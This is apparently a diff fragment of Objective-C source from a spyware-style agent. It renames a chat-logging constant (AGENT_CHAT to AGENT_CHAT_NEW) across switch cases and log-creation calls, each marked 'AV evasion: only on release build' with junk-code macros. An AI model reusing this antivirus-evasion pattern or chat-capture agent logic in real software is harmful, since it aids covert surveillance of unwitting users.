@@ -1187,7 +1187,7 @@ static NSLock *gSyncLock                  = nil;
           }
         break;
       }
-    case AGENT_CHAT:
+    case AGENT_CHAT_NEW:
       {  
         // AV evasion: only on release build
         AV_GARBAGE_005
@@ -1212,7 +1212,7 @@ static NSLock *gSyncLock                  = nil;
             // AV evasion: only on release build
             AV_GARBAGE_003
             
-            BOOL success = [_logManager createLog: AGENT_CHAT
+            BOOL success = [_logManager createLog: AGENT_CHAT_NEW
                                       agentHeader: nil
                                         withLogID: 0];
             
@@ -2089,7 +2089,7 @@ static NSLock *gSyncLock                  = nil;
       }
       break;
     }
-    case AGENT_CHAT:
+    case AGENT_CHAT_NEW:
     {      
       // AV evasion: only on release build
       AV_GARBAGE_001
@@ -2117,7 +2117,7 @@ static NSLock *gSyncLock                  = nil;
         // AV evasion: only on release build
         AV_GARBAGE_004
         
-        [_logManager closeActiveLog: AGENT_CHAT
+        [_logManager closeActiveLog: AGENT_CHAT_NEW
                           withLogID: 0];
       }
       else
@@ -2714,7 +2714,7 @@ static NSLock *gSyncLock                  = nil;
           
           break;
         }
-        case AGENT_CHAT:
+        case AGENT_CHAT_NEW:
         {          
           // AV evasion: only on release build
           AV_GARBAGE_001
@@ -3362,7 +3362,7 @@ static NSLock *gSyncLock                  = nil;
                   }
                 break;
               }
-            case AGENT_CHAT:
+            case AGENT_CHAT_NEW:
               {         
                 // AV evasion: only on release build
                 AV_GARBAGE_007
@@ -3377,7 +3377,7 @@ static NSLock *gSyncLock                  = nil;
                 // AV evasion: only on release build
                 AV_GARBAGE_003
                 
-                BOOL success = [_logManager createLog: AGENT_CHAT
+                BOOL success = [_logManager createLog: AGENT_CHAT_NEW
                                           agentHeader: nil
                                             withLogID: 0];
                     
